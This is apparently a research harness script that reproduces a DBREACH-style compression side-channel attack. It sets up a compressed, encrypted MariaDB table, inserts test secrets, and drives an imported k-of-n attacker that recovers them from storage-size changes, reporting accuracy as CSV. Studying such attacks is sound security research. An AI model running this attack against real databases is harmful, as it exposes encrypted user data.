# /app/kofn_cli.py
import os
import sys
import time
import random
import string
import atexit
import importlib

# ───────────────── 모듈 로드 경로: resources 우선 ─────────────────
CODE_PATHS = os.getenv("GDBREACH_CODE_DIR", "/app/resources:/app").split(":")
for _p in CODE_PATHS:
    if _p and _p not in sys.path:
        sys.path.insert(0, _p)

# ───────────────── k-of-n 바이너리 전용 로더 ─────────────────
def _load_kofn_attacker_ctor():
    m = importlib.import_module("k_of_n_attacker_binary")
    candidates = ["kOfNAttacker", "KOfNAttacker", "kofnAttacker"]
    for name in candidates:
        if hasattr(m, name):
            return getattr(m, name), m
    raise AttributeError(
        "[FATAL] k_of_n_attacker_binary에 적절한 생성자 심볼이 없습니다. "
        f"찾은 심볼: {', '.join([x for x in dir(m) if not x.startswith('_')])}"
    )

def _load_dbreach_impl_ctor():
    m = importlib.import_module("dbreacher_impl_binary_search")
    candidates = ["DBREACHerImpl", "DBREACHImpl", "DBREACHer", "DBREACH"]
    for name in candidates:
        if hasattr(m, name):
            return getattr(m, name), m
    raise AttributeError(
        "[FATAL] dbreacher_impl_binary_search에 적절한 구현 심볼이 없습니다. "
        f"찾은 심볼: {', '.join([x for x in dir(m) if not x.startswith('_')])}"
    )

AttackerCtor, _attacker_mod = _load_kofn_attacker_ctor()
DBREACHerImpl, _dbreach_mod = _load_dbreach_impl_ctor()

import utils.mariadb_utils as utils

# ---- 로그 디폴트: 켜둠(원하면 실행 시 환경변수로 0) ----
os.environ.setdefault("DBREACH_LOG_FULL", "1")
os.environ.setdefault("ATTACK_VERBOSE", "1")

# ===================== Tee (콘솔+파일 동시 기록) =====================
class _Tee:
    def __init__(self, streams):
        self.streams = streams
    def write(self, s):
        for st in self.streams:
            try:
                st.write(s)
            except Exception:
                pass
    def flush(self):
        for st in self.streams:
            try:
                st.flush()
            except Exception:
                pass

# ===================== 인자 파싱 =====================
mode = "--random"            # --random | --english | --emails
secrets_to_try = [1]         # 기본 k
seed = None                  # 재현성용
start_idx_override = None    # --start 로 강제 가능
max_setup_attempts = 10      # 무한루프 방지
logfile = None               # 로그 저장 경로 (옵션)

args = sys.argv[1:]
i = 0
while i < len(args):
    a = args[i]
    if a in ("--random", "--english", "--emails"):
        mode = a
        i += 1
    elif a == "--num_secrets":
        j = i + 1
        vals = []
        while j < len(args) and args[j].lstrip("-").isdigit():
            vals.append(int(args[j]))
            j += 1
        if vals:
            secrets_to_try = vals
        i = j
    elif a == "--seed":
        if i + 1 < len(args):
            seed = int(args[i+1]); i += 2
        else:
            i += 1
    elif a == "--start":
        if i + 1 < len(args):
            start_idx_override = int(args[i+1]); i += 2
        else:
            i += 1
    elif a == "--attempts":
        if i + 1 < len(args):
            max_setup_attempts = max(1, int(args[i+1])); i += 2
        else:
            i += 1
    elif a == "--logfile":
        if i + 1 < len(args):
            logfile = args[i+1]; i += 2
        else:
            i += 1
    else:
        i += 1

# ===================== 로그 파일 tee 설정 =====================
_log_fp = None
if logfile:
    _log_fp = open(logfile, "w", buffering=1, encoding="utf-8", errors="replace")
    sys.stdout = _Tee([sys.__stdout__, _log_fp])
    sys.stderr = _Tee([sys.__stderr__, _log_fp])

def _close_log():
    global _log_fp
    try:
        if _log_fp:
            _log_fp.flush()
            _log_fp.close()
    except Exception:
        pass

atexit.register(_close_log)

# ===================== 상수/초기화 =====================
maxRowSize = int(os.getenv("DBREACH_MAX_ROW_SIZE", "4096"))
filler_rows_cfg = int(os.getenv("DBREACH_FILLER_ROWS", "600"))
comp_base_cfg = int(os.getenv("DBREACH_COMP_BASE", "2048"))
phase_span_cfg = int(os.getenv("DBREACH_PHASE_SPAN", "2048"))
table = os.getenv("TABLE", "victimtable")

# ★ 환경에서 DB 접속/경로 받기(하드코딩 제거)
db_name  = os.getenv("DB_NAME", "flask_db")
db_host  = os.getenv("DB_HOST", "mariadb_container")
db_port  = int(os.getenv("DB_PORT", "3306"))
db_user  = os.getenv("DB_USER", "root")
db_pass  = os.getenv("DB_PASSWORD", "your_root_password")
datadir  = os.getenv("MARIA_DATADIR", "/var/lib/mysql")

# 재현성 RNG
_rng = random.Random(seed) if seed is not None else random.Random()

def env_report(ctrl: utils.MariaDBController):
    try:
        print("[ENV] MariaDB variables snapshot:")
        for like in ("innodb_page_size",
                     "innodb_compression_algorithm",
                     "innodb_file_per_table",
                     "innodb_encrypt_tables",
                     "innodb_encrypt_log"):
            ctrl.cur.execute(f"SHOW VARIABLES LIKE '{like}';")
            for name, val in ctrl.cur.fetchall():
                print(f"  {name}={val}")
    except Exception as e:
        print(f"[ENV] warn: failed to read variables: {e}")

def _stat_alloc_bytes(db: str, tab: str) -> int:
    ibd = os.path.join(datadir, db, f"{tab}.ibd")
    try:
        st = os.stat(ibd)
        alloc = getattr(st, "st_blocks", 0) * 512
        return alloc if alloc > 0 else st.st_size
    except FileNotFoundError:
        return -1

# DB 연결 (컨테이너 내부 주소/계정)
control = utils.MariaDBController(
    db_name,
    host=db_host,
    port=db_port,
    user=db_user,
    password=db_pass,
    datadir=datadir,
)

# 환경 리포트 1회 출력
env_report(control)

# 초기 테이블 정리 및 (압축+암호화) 생성
control.drop_table(table)
control.create_basic_table(table, varchar_len=maxRowSize, compressed=True, encrypted=True)

# ===================== 후보군 구성 =====================
RES_DIR = os.getenv("RES_DIR", "/app/resources")
possibilities = []
if mode == "--random":
    for _ in range(2000):
        size = _rng.randint(10, 20)
        secret = "".join(_rng.choices(string.ascii_lowercase, k=size))
        possibilities.append(secret)
elif mode == "--english":
    with open(os.path.join(RES_DIR, "10000-english-long.txt"), encoding="utf-8") as f:
        for line in f:
            possibilities.append(line.strip().lower())
elif mode == "--emails":
    with open(os.path.join(RES_DIR, "fake-emails.txt"), encoding="utf-8") as f:
        for line in f:
            possibilities.append(line.strip().lower())
else:
    print(f"[WARN] unknown mode {mode}, fallback --random")
    for _ in range(2000):
        size = _rng.randint(10, 20)
        secret = "".join(_rng.choices(string.ascii_lowercase, k=size))
        possibilities.append(secret)

# filler charset (논문과 동일 컨셉: 소문자/특정문자 제거)
fset = set(string.printable) - set(string.ascii_lowercase) - {'*'}
if mode == "--emails":
    fset = fset - {'_', '.', '@'}
fillerCharSet = ''.join(sorted(fset))

# CSV 헤더
print("records_on_page,k,accuracy_n_500,accuracy_n_750,accuracy_n_1000,accuracy_n_1250,accuracy_n_1500,setup_time,per_guess_time")

# ===================== k 루프 =====================
for num_secrets in secrets_to_try:
    _rng.shuffle(possibilities)

    # trial 수는 1회
    for trial in range(1):
        # 항상 깨끗한 (압축+암호화) 테이블로 시작
        control.drop_table(table)
        control.create_basic_table(table, varchar_len=maxRowSize, compressed=True, encrypted=True)

        # 시크릿 삽입
        guesses = []
        correct_guesses = set()
        for sidx in range(num_secrets):
            secret = possibilities[(trial + sidx) % len(possibilities)]
            print(f"[SETUP] INSERT secret id={sidx+1} val='{secret}'")
            control.insert_row(table, sidx + 1, secret)
            guesses.append(secret)
            correct_guesses.add(secret)

        # 나머지 오답 후보(총 1500개까지)
        for sidx in range(num_secrets, 1500):
            wrong_guess = possibilities[(trial + sidx) % len(possibilities)]
            guesses.append(wrong_guess)

        # 슬라이스 풀
        _500_guesses  = set(guesses[:500])
        _750_guesses  = set(guesses[:750])
        _1000_guesses = set(guesses[:1000])
        _1250_guesses = set(guesses[:1250])

        # DBREACHer: filler는 넉넉히 뒤쪽 페이지부터
        startIdx = start_idx_override if start_idx_override is not None else max(10000, num_secrets + 10)

        # ───── 추가 로그: INIT/FILLER/ENV 포맷 맞춤 ─────
        phase_desc = f"{phase_span_cfg}/{phase_span_cfg * 2}/{phase_span_cfg * 3}"
        print(
            f"[INIT] compressChar='*', fillers={filler_rows_cfg} rows, "
            f"startIdx={startIdx}, maxRowSize={maxRowSize}, "
            f"phases=3 (binary search span per phase: {phase_desc} bytes, base={comp_base_cfg})"
        )
        old_alloc = _stat_alloc_bytes(db_name, table)
        print(f"[FILLER] old_alloc={old_alloc}")

        # 구현체 생성 (k-of-n 바이너리용)
        dbreach = DBREACHerImpl(
            control,
            table,
            startIdx,
            maxRowSize,
            fillerCharSet,
            ord('*'),
        )

        # 공격자 생성 (k-of-n 바이너리: k, dbreacher, guesses, tiesOn)
        attacker = AttackerCtor(num_secrets, dbreach, guesses, tiesOn=False)

        # ===== 세팅 및 측정 루프(재시도 상한 있음) =====
        attempt = 0
        success = False
        setupStart = time.time()
        while not success and attempt < max_setup_attempts:
            attempt += 1
            print("[REINSERT] first-time setup (no previous fillers)" if attempt == 1
                  else f"[REINSERT] re-setup attempt {attempt}/{max_setup_attempts}")
            ok = attacker.setUp()
            if not ok:
                continue
            try:
                success = attacker.tryAllGuesses(verbose=True)
            except RuntimeError as e:
                print(f"[MAIN] tryAllGuesses raised: {e} (will retry)")
                success = False

        setupEnd = time.time()

        if not success:
            print(f"[MAIN] failed to stabilize after {max_setup_attempts} attempts; aborting this trial.")
            print(f"0,{num_secrets},0,0,0,0,0,{setupEnd - setupStart},0")
            continue

        # k-of-n: 압축 점수 기반으로 top-k 가져오기
        topKResults = attacker.getTopKGuesses()

        # topKResults는 [(score, guess), ...] 형태
        # 모든 guess의 점수를 정렬된 리스트로 만들기
        allScores = [(attacker.compressibilityScores.get(g, 0), g) for g in guesses]
        allScores.sort(reverse=True)

        # 디버그 출력(상위 50개)
        print("[RESULT] top K-of-N results (predicted top-k):")
        for score, g in topKResults[:50]:
            in_correct = "✓" if g in correct_guesses else "✗"
            print(f"  score={score:.6f}  g='{g}' {in_correct}")
        if len(topKResults) > 50:
            print(f"  ... and {len(topKResults)-50} more")

        print("[RESULT] all scores ranking (top 50):")
        for score, g in allScores[:50]:
            in_correct = "✓" if g in correct_guesses else "✗"
            print(f"  score={score:.6f}  g='{g}' {in_correct}")
        if len(allScores) > 50:
            print(f"  ... and {len(allScores)-50} more")

        # pcts를 allScores로 대체 (기존 정확도 계산 호환성 유지)
        pcts = allScores

        # 상위 k 정확도
        def topk_acc(pool):
            top = [(pct, g) for pct, g in pcts if g in pool][:num_secrets]
            return (sum(1 for _, g in top if g in correct_guesses) / num_secrets) if num_secrets > 0 else 0.0

        accuracy_500  = topk_acc(_500_guesses)
        accuracy_750  = topk_acc(_750_guesses)
        accuracy_1000 = topk_acc(_1000_guesses)
        accuracy_1250 = topk_acc(_1250_guesses)
        accuracy_1500 = sum(1 for _, g in pcts[:num_secrets] if g in correct_guesses) / num_secrets

        end = time.time()
        per_guess_time = (end - setupEnd) / max(len(guesses), 1)

        # CSV: records_on_page는 실제 삽입된 filler 행 수(impl이 rowsAdded 노출한다고 가정)
        records_on_page = getattr(dbreach, "rowsAdded", 0)
        print(f"{records_on_page},{num_secrets},{accuracy_500},{accuracy_750},{accuracy_1000},{accuracy_1250},{accuracy_1500},{setupEnd - setupStart},{per_guess_time}")
